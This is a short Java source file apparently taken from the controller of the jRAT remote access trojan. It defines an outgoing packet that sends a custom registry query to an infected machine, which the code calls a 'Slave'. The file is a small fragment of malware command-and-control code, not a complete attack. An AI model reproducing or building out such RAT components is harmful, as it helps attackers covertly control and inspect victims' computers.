package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet80CustomRegQuery implements OutgoingPacket {

	private String query;

	public Packet80CustomRegQuery(String query) {
		this.query = query;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(query);
	}

	@Override
	public short getPacketId() {
		return 80;
	}

}
